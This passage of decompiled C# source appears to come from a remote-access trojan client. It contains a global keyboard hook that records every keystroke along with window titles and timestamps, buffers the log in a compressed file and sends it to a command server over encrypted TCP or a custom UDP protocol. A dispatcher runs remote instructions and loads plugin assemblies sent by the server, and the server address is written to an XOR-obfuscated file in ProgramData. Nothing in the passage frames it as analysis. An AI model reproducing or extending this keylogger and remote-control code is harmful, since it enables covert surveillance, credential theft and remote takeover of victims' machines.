					KeyboardSetHook();
					Application.Run();
				});
				thread.SetApartmentState(ApartmentState.MTA);
				thread.Start();
			}
			ThreadPool.QueueUserWorkItem(loopKeyboardProc);
		}

		public void getKeyboardContent(byte[] bytes)
		{
			contentProcessor();
			lock (LogSyncRoot)
			{
				byte[] array = ReadKeyboardContent();
				if (array != null && array.Length != 0)
				{
					SocketManger.SocketMangerSendMessage(GZip.Compress(array), 101, BitConverter.ToInt32(bytes, 0));
					if (File.Exists(keyboardfilePath))
					{
						File.Delete(keyboardfilePath);
					}
				}
			}
		}

		public void contentProcessor()
		{
			try
			{
				byte[] array = null;
				lock (syncroot)
				{
					if (KeyboardList.Count > 0)
					{
						array = KeyboardList.ToArray();
						KeyboardList.Clear();
					}
				}
				if (array != null && array.Length == 0)
				{
					return;
				}
				lock (LogSyncRoot)
				{
					List<byte> list = new List<byte>();
					byte[] array2 = ReadKeyboardContent();
					if (array2 != null)
					{
						list.AddRange(array2);
					}
					list.AddRange(array);
					File.WriteAllBytes(keyboardfilePath, GZip.Compress(list.ToArray()));
				}
			}
			catch (Exception)
			{
			}
		}

		private byte[] ReadKeyboardContent()
		{
			if (File.Exists(keyboardfilePath))
			{
				byte[] array = File.ReadAllBytes(keyboardfilePath);
				if (array != null && array.Length != 0)
				{
					return GZip.Decompress(array);
				}
			}
			return null;
		}

		private void loopKeyboardProc(object state)
		{
			while (true)
			{
				Thread.Sleep(TimeSpan.FromSeconds(5.0));
				try
				{
					contentProcessor();
				}
				catch (Exception)
				{
				}
			}
		}

		private void KeyboardSetHook()
		{
			try
			{
				using Process process = Process.GetCurrentProcess();
				using ProcessModule processModule = process.MainModule;
				_HHOOK = NtApi32.SetWindowsHookEx(13, _KeyboardProc, NtApi32.GetModuleHandle(processModule.ModuleName), 0u);
				if (_HHOOK == IntPtr.Zero)
				{
					throw new Exception();
				}
			}
			catch (Exception)
			{
				KeyboardList = null;
				_KeyboardProc = null;
				KeyBoardDisplayList.clearHashtable();
			}
		}

		private IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
		{
			try
			{
				if (nCode >= 0 && wParam == (IntPtr)256)
				{
					StringBuilder stringBuilder = new StringBuilder();
					int num = Marshal.ReadInt32(lParam);
					string text = KeyBoardDisplayList.GetStrByCode(num) ?? ("[" + Enum.GetName(typeof(Keys), num) + "]");
					string activeWindowTitle = GetActiveWindowTitle();
					if (activeWindowTitle.Equals(CurrentActiveWindowTitle))
					{
						stringBuilder.Append(text);
					}
					else
					{
						stringBuilder.AppendLine();
						stringBuilder.AppendLine();
						stringBuilder.AppendLine("[ title ]: " + activeWindowTitle);
						stringBuilder.AppendLine("[ time ]: " + DateTime.Now);
						stringBuilder.Append("[ content ]: " + text);
						CurrentActiveWindowTitle = activeWindowTitle;
					}
					lock (syncroot)
					{
						KeyboardList.AddRange(Encoding.UTF8.GetBytes(stringBuilder.ToString().ToLower()));
					}
				}
				return NtApi32.CallNextHookEx(_HHOOK, nCode, wParam, lParam);
			}
			catch (Exception)
			{
				return IntPtr.Zero;
			}
		}

		private string GetActiveWindowTitle()
		{
			try
			{
				NtApi32.GetWindowThreadProcessId(NtApi32.GetForegroundWindow(), out var lpdwProcessId);
				return Process.GetProcessById((int)lpdwProcessId).MainWindowTitle ?? "?????";
			}
			catch
			{
				return "?????";
			}
		}

		public void KeyboardStopSetHook()
		{
			try
			{
				NtApi32.UnhookWindowsHookEx(_HHOOK);
				KeyboardList?.Clear();
				Application.Exit();
			}
			catch (Exception)
			{
			}
			finally
			{
				KeyBoardDisplayList.clearHashtable();
				KeyboardList = null;
				_KeyboardProc = null;
				GC.Collect();
			}
		}
	}
	public enum Keys
	{
		Modifiers = -65536,
		None = 0,
		LButton = 1,
		RButton = 2,
		Cancel = 3,
		MButton = 4,
		XButton1 = 5,
		XButton2 = 6,
		Back = 8,
		Tab = 9,
		LineFeed = 10,
		Clear = 12,
		Return = 13,
		Enter = 13,
		ShiftKey = 16,
		ControlKey = 17,
		Menu = 18,
		Pause = 19,
		Capital = 20,
		CapsLock = 20,
		KanaMode = 21,
		HanguelMode = 21,
		HangulMode = 21,
		JunjaMode = 23,
		FinalMode = 24,
		HanjaMode = 25,
		KanjiMode = 25,
		Escape = 27,
		IMEConvert = 28,
		IMENonconvert = 29,
		IMEAccept = 30,
		IMEAceept = 30,
		IMEModeChange = 31,
		Space = 32,
		Prior = 33,
		PageUp = 33,
		Next = 34,
		PageDown = 34,
		End = 35,
		Home = 36,
		Left = 37,
		Up = 38,
		Right = 39,
		Down = 40,
		Select = 41,
		Print = 42,
		Execute = 43,
		Snapshot = 44,
		PrintScreen = 44,
		Insert = 45,
		Delete = 46,
		Help = 47,
		D0 = 48,
		D1 = 49,
		D2 = 50,
		D3 = 51,
		D4 = 52,
		D5 = 53,
		D6 = 54,
		D7 = 55,
		D8 = 56,
		D9 = 57,
		A = 65,
		B = 66,
		C = 67,
		D = 68,
		E = 69,
		F = 70,
		G = 71,
		H = 72,
		I = 73,
		J = 74,
		K = 75,
		L = 76,
		M = 77,
		N = 78,
		O = 79,
		P = 80,
		Q = 81,
		R = 82,
		S = 83,
		T = 84,
		U = 85,
		V = 86,
		W = 87,
		X = 88,
		Y = 89,
		Z = 90,
		LWin = 91,
		RWin = 92,
		Apps = 93,
		Sleep = 95,
		NumPad0 = 96,
		NumPad1 = 97,
		NumPad2 = 98,
		NumPad3 = 99,
		NumPad4 = 100,
		NumPad5 = 101,
		NumPad6 = 102,
		NumPad7 = 103,
		NumPad8 = 104,
		NumPad9 = 105,
		Multiply = 106,
		Add = 107,
		Separator = 108,
		Subtract = 109,
		Decimal = 110,
		Divide = 111,
		F1 = 112,
		F2 = 113,
		F3 = 114,
		F4 = 115,
		F5 = 116,
		F6 = 117,
		F7 = 118,
		F8 = 119,
		F9 = 120,
		F10 = 121,
		F11 = 122,
		F12 = 123,
		F13 = 124,
		F14 = 125,
		F15 = 126,
		F16 = 127,
		F17 = 128,
		F18 = 129,
		F19 = 130,
		F20 = 131,
		F21 = 132,
		F22 = 133,
		F23 = 134,
		F24 = 135,
		NumLock = 144,
		Scroll = 145,
		LShiftKey = 160,
		RShiftKey = 161,
		LControlKey = 162,
		RControlKey = 163,
		LMenu = 164,
		RMenu = 165,
		BrowserBack = 166,
		BrowserForward = 167,
		BrowserRefresh = 168,
		BrowserStop = 169,
		BrowserSearch = 170,
		BrowserFavorites = 171,
		BrowserHome = 172,
		VolumeMute = 173,
		VolumeDown = 174,
		VolumeUp = 175,
		MediaNextTrack = 176,
		MediaPreviousTrack = 177,
		MediaStop = 178,
		MediaPlayPause = 179,
		LaunchMail = 180,
		SelectMedia = 181,
		LaunchApplication1 = 182,
		LaunchApplication2 = 183,
		OemSemicolon = 186,
		Oem1 = 186,
		Oemplus = 187,
		Oemcomma = 188,
		OemMinus = 189,
		OemPeriod = 190,
		OemQuestion = 191,
		Oem2 = 191,
		Oemtilde = 192,
		Oem3 = 192,
		OemOpenBrackets = 219,
		Oem4 = 219,
		OemPipe = 220,
		Oem5 = 220,
		OemCloseBrackets = 221,
		Oem6 = 221,
		OemQuotes = 222,
		Oem7 = 222,
		Oem8 = 223,
		OemBackslash = 226,
		Oem102 = 226,
		ProcessKey = 229,
		Packet = 231,
		Attn = 246,
		Crsel = 247,
		Exsel = 248,
		EraseEof = 249,
		Play = 250,
		Zoom = 251,
		NoName = 252,
		Pa1 = 253,
		OemClear = 254,
		KeyCode = 65535,
		Shift = 65536,
		Control = 131072,
		Alt = 262144
	}
	public static class NtApi32
	{
		public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool UnhookWindowsHookEx(IntPtr hhk);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll", SetLastError = true)]
		public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	}
}
namespace newClient.Comms
{
	public class Channel<T>
	{
		private readonly Queue<T> m_collection = new Queue<T>();

		private readonly object syncRoot = new object();

		private readonly int m_millisecondsTimeout = 500;

		private readonly int m_maxCapacity;

		private bool IsCompleted;

		public int Count
		{
			get
			{
				lock (syncRoot)
				{
					return m_collection.Count;
				}
			}
		}

		public Channel(int capacity = 65535)
		{
			m_maxCapacity = capacity;
		}

		public bool TryEnqueue(T item)
		{
			lock (syncRoot)
			{
				if (IsCompleted)
				{
					return false;
				}
				while (m_collection.Count >= m_maxCapacity)
				{
					if (!Monitor.Wait(syncRoot, m_millisecondsTimeout) || IsCompleted)
					{
						return false;
					}
				}
				m_collection.Enqueue(item);
				if (m_collection.Count == 1)
				{
					Monitor.PulseAll(syncRoot);
				}
				return true;
			}
		}

		public bool TryDequeue(out T item)
		{
			lock (syncRoot)
			{
				if (IsCompleted)
				{
					item = default(T);
					return false;
				}
				while (m_collection.Count == 0)
				{
					if (!Monitor.Wait(syncRoot, m_millisecondsTimeout) || IsCompleted)
					{
						item = default(T);
						return false;
					}
				}
				item = m_collection.Dequeue();
				if (m_collection.Count + 1 == m_maxCapacity)
				{
					Monitor.PulseAll(syncRoot);
				}
				return true;
			}
		}

		public bool TryPeek(out T item)
		{
			lock (syncRoot)
			{
				if (IsCompleted || m_collection.Count == 0)
				{
					item = default(T);
					return false;
				}
				item = m_collection.Peek();
				return true;
			}
		}

		public void RemoveCount(int count)
		{
			lock (syncRoot)
			{
				for (int i = 0; i < count; i++)
				{
					m_collection.Dequeue();
				}
			}
		}

		public void CompleteAdding()
		{
			lock (syncRoot)
			{
				IsCompleted = true;
				m_collection.Clear();
			}
		}
	}
	public interface ISocketModule
	{
		algorithm.AesManaged aesManaged { get; set; }

		bool Connected { get; set; }

		ProType ProtocolType { get; set; }

		Channel<byte[]> ConsumerChannel { get; set; }

		bool socketConnect(string host, int port);

		int socketSend(byte[] message);

		void socketclose();
	}
	public class SocketManger
	{
		public static int ModuleSleep = 20000;

		public static ISocketModule SocketModule;

		private static Queue<string> hostsqueue = new Queue<string>();

		public static keyboardManagaers kkeyboardManagaers = new keyboardManagaers();

		public static void Run()
		{
			kkeyboardManagaers.Run();
			Logger.Info("kkeyboardManagaers");
			while (true)
			{
				try
				{
					CreateSocketModule();
					Logger.Info("CreateSocketModule");
					while (SocketModule != null && SocketModule.Connected)
					{
						if (SocketModule.ConsumerChannel.TryDequeue(out var item))
						{
							OnProcessorMsg(item);
						}
					}
				}
				catch (Exception)
				{
				}
				Thread.Sleep(ModuleSleep);
			}
		}

		private static void getHostQueueConfig(out string host, out string port)
		{
			Queue<string> queue = hostsqueue;
			if (queue != null && queue.Count == 0)
			{
				hostsqueue = new Queue<string>(config.host.Split(new char[1] { ';' }));
			}
			object obj = hostsqueue?.Dequeue()?.Split(new char[1] { ':' });
			string[] array = (string[])obj;
			host = ((array != null) ? array[0] : null);
			port = ((array != null) ? array[1] : null);
		}

		private static void CreateSocketModule()
		{
			if (SocketModule == null || !SocketModule.Connected)
			{
				getHostQueueConfig(out var host, out var port);
				switch (config.PProType)
				{
				case ProType.TCP:
					SocketModule = new TcpServer();
					break;
				case ProType.UDP:
					SocketModule = new RTPUDP();
					break;
				}
				SocketModule.socketConnect(host, int.Parse(port));
			}
		}

		public static void OnProcessorMsg(byte[] msg)
		{
			try
			{
				msg = SocketModule.aesManaged.AesDecrypt(msg);
				switch (msg[0])
				{
				case 80:
					InstructionHelper.Exec(msg.Skip(1).ToArray());
					break;
				case 91:
					Logger.Info("clientinfo");
					clientinfoProcessor();
					break;
				case 86:
					AssemblyLoader.AddAndLoadAssamebly(Serializable.Deserialize(GZip.Decompress(msg.Skip(1).ToArray())) as pluginMessages);
					break;
				case 87:
					AssemblyLoader.ExecAssamebly(Serializable.Deserialize(GZip.Decompress(msg.Skip(1).ToArray())) as pluginMessages);
					break;
				case 88:
					AssemblyLoader.UnloadAssamebly(Serializable.Deserialize(GZip.Decompress(msg.Skip(1).ToArray())) as pluginMessages);
					break;
				case 89:
					AssemblyLoader.UnloadClientIDpulgin(msg.Skip(1).ToArray());
					break;
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
			}
		}

		public static void clientinfoProcessor()
		{
			config.session.ProtocolType = Enum.GetName(typeof(ProType), SocketModule.ProtocolType);
			List<byte> list = new List<byte>();
			list.AddRange(BitConverter.GetBytes(91));
			list.AddRange(GZip.Compress(Serializable.SerialiseData(config.session)));
			SocketMangerSendMessage(list.ToArray(), 0);
		}

		public static int SocketMangerSendMessage(byte[] message, byte type = 0, int ClientID = 0)
		{
			if (message == null || message.Length == 0 || SocketModule == null || !SocketModule.Connected)
			{
				return -1;
			}
			List<byte> list = new List<byte>();
			if (ClientID != 0)
			{
				list.AddRange(BitConverter.GetBytes(ClientID));
			}
			if (type != 0)
			{
				list.Add(type);
			}
			list.AddRange(message);
			return SocketModule.socketSend(SocketModule.aesManaged.AesEncrypt(list.ToArray()));
		}
	}
}
namespace newClient.Comms.UDP
{
	public class RTPUDP : ISocketModule
	{
		private readonly object sndSync = new object();

		private readonly DateTime refTime = DateTime.Now;

		private UdpClient client;

		private bool Running = true;

		private bool CompleteQueueStatus;

		public readonly Channel<byte[]> rcvProducerChannel;

		private readonly SortedList<uint, udpSegment> rcvSortedLists;

		private readonly Channel<udpSegment> rcvChannel;

		private readonly List<udpSegment> sndLists;

		private readonly Channel<udpSegment> sndChannel;

		private ulong LastTime;

		private bool _disposed;

		private uint conv = GetSessionConv();

		private uint mss = 1300u;

		private uint snd_una = 1u;

		private uint snd_nxt = 1u;

		private uint snd_wnd = 256u;

		private uint rcv_nxt = 1u;

		private uint rcv_wnd = 256u;

		private uint rmt_wnd = 1u;

		private uint cwnd = 1u;

		private uint probe;

		private uint ssthresh = 8u;

		private uint rx_srtt;

		private uint rx_minrto = 100u;

		private uint rx_rto = 200u;

		private uint rx_rttval;

		private uint probe_wait;

		private uint ts_probe;

		private bool isresend;

		public RTPUDPType RTPUDPStatus = RTPUDPType.DISCONNECT;

		private const int ASK_SEND = 1;

		private const int ASK_TELL = 2;

		private const int RTO_MAX = 60000;

		private const int PROBE_INIT = 7000;

		private const int PROBE_LIMIT = 120000;

		private const int interval = 10;

		private const uint timeInterval = 5000u;

		private const uint MaxTimeOutCount = 3u;

		private uint timeoutIndex;

		private ulong timeoutTs;

		public algorithm.AesManaged aesManaged { get; set; }

		public bool Connected
		{
			get
			{
				return RTPUDPStatus == RTPUDPType.CONNECT;
			}
			set
			{
			}
		}

		public ProType ProtocolType
		{
			get
			{
				return ProType.UDP;
			}
			set
			{
			}
		}

		public Channel<byte[]> ConsumerChannel { get; set; }

		public RTPUDP()
		{
			rcvProducerChannel = new Channel<byte[]>();
			rcvSortedLists = new SortedList<uint, udpSegment>();
			rcvChannel = new Channel<udpSegment>();
			sndLists = new List<udpSegment>();
			sndChannel = new Channel<udpSegment>((int)snd_wnd);
			ConsumerChannel = new Channel<byte[]>();
			aesManaged = new algorithm.AesManaged(config.SessionKey.Replace("@", ""));
		}

		public bool socketConnect(string host, int port)
		{
			client = new UdpClient(host, port);
			ThreadPool.QueueUserWorkItem(ReceiveProcessor);
			ThreadPool.QueueUserWorkItem(Update);
			for (int i = 1; i <= 1; i++)
			{
				if (RTPUDPStatus == RTPUDPType.CONNECT)
				{
					break;
				}
				byte[] array = udpSegment.udpSegmentToBytes(new udpSegment
				{
					conv = conv,
					sn = 0u,
					wnd = rcv_wnd,
					una = 0u,
					cmd = 21,
					data = Encoding.UTF8.GetBytes(config.SessionKey),
					length = (uint)config.SessionKey.Length
				});
				client.Send(array, array.Length);
				Thread.Sleep(10000);
			}
			if (RTPUDPStatus == RTPUDPType.DISCONNECT)
			{
				Running = false;
			}
			return RTPUDPStatus == RTPUDPType.CONNECT;
		}

		public int socketSend(byte[] data)
		{
			if (RTPUDPStatus != RTPUDPType.CONNECT)
			{
				return -1;
			}
			int num = (int)(data.Length + mss - 1) / (int)mss - 1;
			lock (sndSync)
			{
				using MemoryStream input = new MemoryStream(data);
				using BinaryReader binaryReader = new BinaryReader(input);
				while (RTPUDPStatus == RTPUDPType.CONNECT)
				{
					byte[] array = binaryReader.ReadBytes((int)mss);
					while (!sndChannel.TryEnqueue(new udpSegment
					{
						conv = conv,
						frg = (uint)num,
						length = (uint)array.Length,
						cmd = 17,
						xmit = 0,
						fastack = 0,
						data = array
					}) && RTPUDPStatus == RTPUDPType.CONNECT)
					{
					}
					if (num == 0)
					{
						break;
					}
					num--;
				}
			}
			if (num != 0)
			{
				return -1;
			}
			return 0;
		}

		public void socketclose()
		{
			RTPUDPClose();
		}

		private void ReceiveProcessor(object state)
		{
			IPEndPoint remoteEP = null;
			while (Running)
			{
				try
				{
					byte[] array = client.Receive(ref remoteEP);
					if (array != null && array.Length >= udpSegment.Segment_OVERHEAD)
					{
						rcvProducerChannel.TryEnqueue(array);
					}
				}
				catch (Exception)
				{
				}
			}
		}

		private void Update(object state)
		{
			try
			{
				while (Running)
				{
					Input();
					Flush();
					Thread.Sleep(10);
				}
			}
			catch (Exception)
			{
				RTPUDPClose();
			}
		}

		private void CompleteQueueProcessor(object state)
		{
			while (RTPUDPStatus == RTPUDPType.CONNECT)
			{
				try
				{
					if (rcvChannel.TryPeek(out var item))
					{
						uint num = item.frg + 1;
						if (rcvChannel.Count >= num)
						{
							using MemoryStream memoryStream = new MemoryStream();
							udpSegment item2;
							while (rcvChannel.TryDequeue(out item2))
							{
								memoryStream.Write(item2.data, 0, item2.data.Length);
								if (item2.frg == 0)
								{
									memoryStream.Flush();
									ConsumerChannel.TryEnqueue(memoryStream.ToArray());
									break;
								}
								item2 = null;
							}
							memoryStream.Close();
						}
						item = null;
					}
				}
				catch (Exception)
				{
				}
				Thread.Sleep(1);
			}
		}

		public void setdatfile()
		{
			byte[] bytes = BitConverter.GetBytes((ushort)new Random().Next(1, 65535));
			byte[] bytes2 = BitConverter.GetBytes((ushort)1);
			using MemoryStream memoryStream = new MemoryStream();
			using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
			binaryWriter.Write(bytes);
			binaryWriter.Write(bytes2);
			byte[] bytes3 = Encoding.Unicode.GetBytes(((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString());
			byte[] array = new byte[32];
			Array.Copy(bytes3, array, bytes3.Length);
			binaryWriter.Write(array);
			binaryWriter.Write((ushort)((IPEndPoint)client.Client.RemoteEndPoint).Port);
			byte[] array2 = memoryStream.ToArray();
			for (int i = 0; i < array2.Length - 2; i++)
			{
				array2[i + 2] ^= bytes[i % 2];
			}
			try
			{
				File.WriteAllBytes(Environment.GetEnvironmentVariable("systemdrive") + "\\programdata\\sJuDr005Km.dat", array2);
			}
			catch
			{
			}
		}

		private void Input()
		{
			uint num = 0u;
			uint num2 = currentMS();
			bool isrcv = false;
			for (int i = 0; i < 50; i++)
			{
				if (rcvProducerChannel.Count <= 0)
				{
					break;
				}
				if (!rcvProducerChannel.TryDequeue(out var item))
				{
					break;
				}
				udpSegment udpSegment2 = udpSegment.BytesToSegment(item);
				timeoutTs = num2 + 10000;
				timeoutIndex = 0u;
				isrcv = true;
				if (udpSegment2 == null || udpSegment2.conv != conv)
				{
					return;
				}
				num = ((num > snd_una) ? num : snd_una);
				unaProcessor(udpSegment2.una);
				if (LastTime < udpSegment2.ts)
				{
					rmt_wnd = udpSegment2.wnd;
					LastTime = udpSegment2.ts;
				}
				switch (udpSegment2.cmd)
				{
				case 16:
					if (_itimediff(num2, udpSegment2.ts) >= 0)
					{
						UpdateAck(_itimediff(num2, udpSegment2.ts));
					}
					fastackProcessor(udpSegment2.sn);
					break;
				case 17:
					if (_itimediff(udpSegment2.sn, rcv_nxt) >= 0)
					{
						PushProcessor(udpSegment2);
					}
					if (_itimediff(udpSegment2.sn, rcv_nxt + rcv_wnd) < 0)
					{
						AckProcessor(udpSegment2.sn, num2, RTPUDPType.ACK);
					}
					break;
				case 18:
					probe |= 2u;
					break;
				case 21:
					RTPUDPStatus = RTPUDPType.CONNECT;
					if (!CompleteQueueStatus)
					{
						ThreadPool.QueueUserWorkItem(CompleteQueueProcessor);
					}
					setdatfile();
					SocketManger.clientinfoProcessor();
					CompleteQueueStatus = true;
					return;
				}
				udpSegment2 = null;
				item = null;
			}
			if (_itimediff(snd_una, num) > 0 && num != 0)
			{
				if (isresend)
				{
					cwnd /= 2u;
					if (cwnd == 0)
					{
						cwnd = 1u;
					}
				}
				else if (cwnd < rmt_wnd)
				{
					if (cwnd < ssthresh)
					{
						cwnd *= 2u;
					}
					else
					{
						cwnd++;
					}
				}
				else
				{
					cwnd = rmt_wnd;
				}
			}
			TimeOutProcessor(num2, isrcv);
		}

		private void TimeOutProcessor(uint current, bool isrcv)
		{
			if (RTPUDPStatus != RTPUDPType.CONNECT)
			{
				return;
			}
			if (timeoutIndex > 2)
			{
				throw new Exception();
			}
			if (timeoutTs < current)
			{
				timeoutIndex++;
				timeoutTs = current + 10000;
				if (!isrcv && sndChannel.Count == 0 && sndLists.Count == 0)
				{
					udpSegmentSend(udpSegment.udpSegmentToBytes(new udpSegment
					{
						conv = conv,
						cmd = 23,
						wnd = wnd_unused(),
						una = rcv_nxt,
						ts = currentMS()
					}));
				}
			}
		}

		private void Flush()
		{
			uint num = currentMS();
			if (rmt_wnd == 0)
			{
				if (probe_wait == 0)
				{
					probe_wait = 7000u;
					ts_probe = num + probe_wait;
				}
				else if (_itimediff(num, ts_probe) >= 0)
				{
					if (probe_wait < 7000)
					{
						probe_wait = 7000u;
					}
					probe_wait += probe_wait / 2u;
					if (probe_wait > 120000)
					{
						probe_wait = 120000u;
					}
					ts_probe = num + probe_wait;
					probe |= 1u;
				}
			}
			else
			{
				ts_probe = 0u;
				probe_wait = 0u;
			}
			if ((probe & (true ? 1u : 0u)) != 0)
			{
				udpSegment udpSegment2 = new udpSegment();
				udpSegment2.conv = conv;
				udpSegment2.wnd = wnd_unused();
				udpSegment2.una = rcv_nxt;
				udpSegment2.cmd = 18;
				udpSegmentSend(udpSegment.udpSegmentToBytes(udpSegment2));
				udpSegment2 = null;
			}
			if ((probe & 2u) != 0)
			{
				udpSegment udpSegment3 = new udpSegment();
				udpSegment3.conv = conv;
				udpSegment3.wnd = wnd_unused();
				udpSegment3.una = rcv_nxt;
				udpSegment3.cmd = 20;
				udpSegmentSend(udpSegment.udpSegmentToBytes(udpSegment3));
				udpSegment3 = null;
			}
			probe = 0u;
			uint num2 = _imin_(cwnd, rmt_wnd);
			uint wnd = wnd_unused();
			int num3 = 0;
			udpSegment item;
			while (_itimediff(snd_nxt, snd_una + num2) < 0 && sndLists.Count < snd_wnd && sndChannel.Count > 0 && sndChannel.TryDequeue(out item))
			{
				item.sn = snd_nxt++;
				sndLists.Add(item);
				num3++;
				item = null;
			}
			if (num3 == 0)
			{
				num3 = 1;
			}
			isresend = false;
			foreach (udpSegment sndList in sndLists)
			{
				if (sndList.xmit == 0 || _itimediff(num, sndList.resendts) >= 0)
				{
					if (sndList.xmit != 0 && _itimediff(num, sndList.resendts) >= 0)
					{
						isresend = true;
					}
					sndList.wnd = wnd;
					sndList.ts = num;
					sndList.una = rcv_nxt;
					sndList.xmit++;
					sndList.rto = rx_rto;
					sndList.resendts = num + sndList.rto;
					udpSegmentSend(udpSegment.udpSegmentToBytes(sndList));
					num3--;
				}
				if (num3 == 0)
				{
					break;
				}
			}
		}

		private void PushProcessor(udpSegment segment)
		{
			if (!rcvSortedLists.ContainsKey(segment.sn))
			{
				rcvSortedLists.Add(segment.sn, segment);
				while (rcvSortedLists.ContainsKey(rcv_nxt))
				{
					rcvChannel.TryEnqueue(rcvSortedLists[rcv_nxt]);
					rcvSortedLists.Remove(rcv_nxt);
					rcv_nxt++;
				}
			}
		}

		private void unaProcessor(uint una)
		{
			int num = 0;
			foreach (udpSegment sndList in sndLists)
			{
				if (_itimediff(una, sndList.sn) > 0)
				{
					num++;
					continue;
				}
				break;
			}
			if (num > 0)
			{
				sndLists.RemoveRange(0, num);
			}
			snd_una = ((sndLists.Count > 0) ? sndLists[0].sn : snd_nxt);
		}

		private void fastackProcessor(uint sn)
		{
			if (_itimediff(sn, snd_una) < 0 || _itimediff(sn, snd_nxt) >= 0)
			{
				return;
			}
			foreach (udpSegment sndList in sndLists)
			{
				if (_itimediff(sndList.sn, snd_nxt) >= 0)
				{
					break;
				}
				if (sn != sndList.sn)
				{
					sndList.fastack++;
				}
				if (sndList.sn == sn)
				{
					sndLists.Remove(sndList);
					snd_una = ((sndLists.Count > 0) ? sndLists[0].sn : snd_nxt);
					break;
				}
			}
		}

		private void AckProcessor(uint sn, uint ts, RTPUDPType type)
		{
			udpSegmentSend(udpSegment.udpSegmentToBytes(new udpSegment
			{
				conv = conv,
				cmd = (byte)type,
				wnd = wnd_unused(),
				una = rcv_nxt,
				sn = sn,
				ts = ts
			}));
		}

		private void udpSegmentSend(byte[] bytes)
		{
			if (RTPUDPStatus == RTPUDPType.CONNECT)
			{
				client.Send(bytes, bytes.Length);
			}
		}

		private void UpdateAck(int rtt)
		{
			if (rx_srtt == 0)
			{
				rx_srtt = (uint)rtt;
				rx_rttval = (uint)rtt / 2u;
			}
			else
			{
				int num = rtt - (int)rx_srtt;
				if (num < 0)
				{
					num = -num;
				}
				rx_rttval = (uint)((int)(3 * rx_rttval) + num) / 4u;
				rx_srtt = (uint)((7 * rx_srtt + rtt) / 8);
				if (rx_srtt < 1)
				{
					rx_srtt = 1u;
				}
			}
			uint middle = rx_srtt + _imax_(10u, 4 * rx_rttval);
			rx_rto = _ibound_(rx_minrto, middle, 60000u);
		}

		private uint wnd_unused()
		{
			if (rcvProducerChannel.Count >= rcv_wnd)
			{
				return 0u;
			}
			return (uint)(rcv_wnd - rcvProducerChannel.Count);
		}

		private uint _ibound_(uint lower, uint middle, uint upper)
		{
			return _imin_(_imax_(lower, middle), upper);
		}

		private uint _imin_(uint a, uint b)
		{
			if (a > b)
			{
				return b;
			}
			return a;
		}

		private uint _imax_(uint a, uint b)
		{
			if (a < b)
			{
				return b;
			}
			return a;
		}

		private int _itimediff(uint later, uint earlier)
		{
			return (int)(later - earlier);
		}

		private uint currentMS()
		{
			return (uint)DateTime.Now.Subtract(refTime).TotalMilliseconds;
		}

		private void RTPUDPClose()
		{
			RTPUDPStatus = RTPUDPType.DISCONNECT;
			Running = false;
			rcvProducerChannel.CompleteAdding();
			rcvSortedLists.Clear();
			rcvChannel.CompleteAdding();
			sndLists.Clear();
			sndChannel.CompleteAdding();
			client.Close();
			ConsumerChannel.CompleteAdding();
			GC.Collect();
		}

		private static uint GetSessionConv()
		{
			return (uint)new Random(BitConverter.ToInt32(Guid.NewGuid().ToByteArray(), 0)).Next(286331153, int.MaxValue);
		}
	}
	public enum RTPUDPType : byte
	{
		ACK = 16,
		PUSH,
		WASK,
		TELL,
		WINS,
		CONNECT,
		DISCONNECT,
		HEARTBREAT
	}
	public class udpSegment
	{
		public static readonly int Segment_OVERHEAD = 39;

		public uint conv { get; set; }

		public uint sn { get; set; }

		public uint wnd { get; set; }

		public uint ts { get; set; }

		public uint una { get; set; }

		public uint rto { get; set; }

		public uint frg { get; set; }

		public uint length { get; set; }

		public uint resendts { get; set; }

		public byte cmd { get; set; }

		public byte xmit { get; set; }

		public byte fastack { get; set; }

		public byte[] data { get; set; }

		public static udpSegment BytesToSegment(byte[] data)
		{
			try
			{
				udpSegment udpSegment2 = new udpSegment
				{
					conv = cc_decode32u(data, 0),
					sn = cc_decode32u(data, 4),
					wnd = cc_decode32u(data, 8),
					ts = cc_decode32u(data, 12),
					una = cc_decode32u(data, 16),
					rto = cc_decode32u(data, 20),
					frg = cc_decode32u(data, 24),
					length = cc_decode32u(data, 28),
					resendts = cc_decode32u(data, 32),
					cmd = cc_decode8u(data, 36),
					xmit = cc_decode8u(data, 37),
					fastack = cc_decode8u(data, 38)
				};
				if (udpSegment2.length != 0)
				{
					if (data.Length - (udpSegment2.length + Segment_OVERHEAD) != 0L)
					{
						return null;
					}
					udpSegment2.data = new byte[udpSegment2.length];
					Buffer.BlockCopy(data, Segment_OVERHEAD, udpSegment2.data, 0, (int)udpSegment2.length);
				}
				return udpSegment2;
			}
			catch (Exception)
			{
				return null;
			}
		}

		public static byte[] udpSegmentToBytes(udpSegment Segment)
		{
			byte[] array = new byte[Segment.length + Segment_OVERHEAD];
			cc_encode32u(array, 0, Segment.conv);
			cc_encode32u(array, 4, Segment.sn);
			cc_encode32u(array, 8, Segment.wnd);
			cc_encode32u(array, 12, Segment.ts);
			cc_encode32u(array, 16, Segment.una);
			cc_encode32u(array, 20, Segment.rto);
			cc_encode32u(array, 24, Segment.frg);
			cc_encode32u(array, 28, Segment.length);
			cc_encode32u(array, 32, Segment.resendts);
			cc_encode8u(array, 36, Segment.cmd);
			cc_encode8u(array, 37, Segment.xmit);
			cc_encode8u(array, 38, Segment.fastack);
			if (Segment.length != 0)
			{
				Buffer.BlockCopy(Segment.data, 0, array, Segment_OVERHEAD, (int)Segment.length);
			}
			return array;
		}

		public static void cc_encode8u(byte[] p, int offset, byte c)
		{
			p[offset] = c;
		}

		public static void cc_encode16u(byte[] p, int offset, ushort w)
		{
